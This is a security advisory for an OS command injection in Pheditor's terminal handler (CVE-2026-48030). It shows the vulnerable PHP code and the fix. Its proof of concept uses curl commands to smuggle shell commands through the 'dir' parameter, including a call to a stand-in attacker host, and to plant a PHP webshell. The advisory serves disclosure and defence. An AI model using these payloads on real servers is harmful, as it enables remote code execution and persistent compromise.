# [C] Pheditor: OS Command Injection in terminal handler via unsanitized 'dir' parameter

## Summary
Severity: Critical
Advisory: GHSA-jvc5-6g7q-c843
CVE: CVE-2026-48030
CWE: CWE-78
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-06-09
Source: https://github.com/advisories/GHSA-jvc5-6g7q-c843
Type: github-advisory

## Affected
- Packagist: `pheditor/pheditor` — affected >=2.0.1 <2.0.4

## Details
### Summary

An OS Command Injection vulnerability in the terminal action handler allows any authenticated user to execute arbitrary OS commands by injecting shell metacharacters into the 'dir' POST parameter, completely bypassing the TERMINAL_COMMANDS whitelist and achieving full Remote Code Execution with web server privileges.

### Details

The terminal handler in pheditor.php accepts two POST parameters: `command` and `dir`. Shell metacharacters are validated on `$command` only — `$dir` is passed to shell_exec() without any sanitization.

Vulnerable code (pheditor.php, line 554–586):

```php
$command = $_POST['command'];  // ✓ metacharacters checked
$dir     = $_POST['dir'];      // ✗ NOT checked — vulnerable

if (strpos($command, '&')  !== false ||
    strpos($command, ';')  !== false ||
    strpos($command, '||') !== false) {
    die(...); // only guards $command, not $dir
}

$output = shell_exec(
    (empty($dir) ? null : 'cd ' . $dir . ' && ')
    . $command . ' && echo \ ; pwd'  // ← $dir injected here
);
```

An attacker sends `dir=/tmp; curl attacker.com #` — the semicolon in $dir is never checked, so the injected command executes freely.

Fix: replace `$dir` with `escapeshellarg($dir)` on line 586.

### PoC

Requirements: valid credentials, terminal permission enabled (default)

Step 1 — Authenticate:

```bash
curl -c cookies.txt -X POST http://TARGET/pheditor.php \
  -d "pheditor_password=admin" -L > /dev/null
```

Step 2 — Get CSRF token:

```bash
TOKEN=$(curl -s -b cookies.txt http://TARGET/pheditor.php | \
  grep -o 'token = "[a-f0-9]*"' | \
  grep -o '"[a-f0-9]*"' | tr -d '"')
```

Step 3 — Confirm curl is blocked via command field:

```bash
curl -s -b cookies.txt -X POST http://TARGET/pheditor.php \
  --data-urlencode "action=terminal" \
  --data-urlencode "token=$TOKEN" \
  --data-urlencode "command=curl https://ifconfig.me" \
  --data-urlencode "dir=/tmp"


→ {"error":true,"message":"Command not allowed"}
```

Step 4 — Bypass whitelist via dir injection:

```bash
TOKEN=$(curl -s -b cookies.txt http://TARGET/pheditor.php | \
  grep -o 'token = "[a-f0-9]*"' | \
  grep -o '"[a-f0-9]*"' | tr -d '"')

curl -s -b cookies.txt -X POST http://TARGET/pheditor.php \
  --data-urlencode "action=terminal" \
  --data-urlencode "token=$TOKEN" \
  --data-urlencode "command=ls" \
  --data-urlencode "dir=/tmp; curl -s https://ifconfig.me #"


→ {"error":false,"message":"OK","dir":"<PUBLIC_IP>"}
```

Step 5 — Full RCE via webshell:

```bash
curl -s -b cookies.txt -X POST http://TARGET/pheditor.php \
  --data-urlencode "action=terminal" \
  --data-urlencode "token=$TOKEN" \
  --data-urlencode "command=ls" \
  --data-urlencode "dir=/var/www/html; echo '<?php system($_GET["c"]);?>' > /var/www/html/shell.php #"

curl "http://TARGET/shell.php?c=id"


→ uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Impact

OS Command Injection (CWE-78). Any authenticated pheditor user with terminal permission enabled (default configuration) is able to:

- Execute arbitrary OS commands as the web server user
- Bypass the TERMINAL_COMMANDS whitelist entirely
- Deploy persistent PHP webshells to the webroot
- Read, write, or delete any file accessible to the web server
- Potentially compromise other applications on the same server

## References
- https://github.com/pheditor/pheditor/security/advisories/GHSA-jvc5-6g7q-c843
- https://github.com/pheditor/pheditor/commit/62b43df7cb8956a9b0deb9bec278ca8676c890c5
- https://github.com/pheditor/pheditor
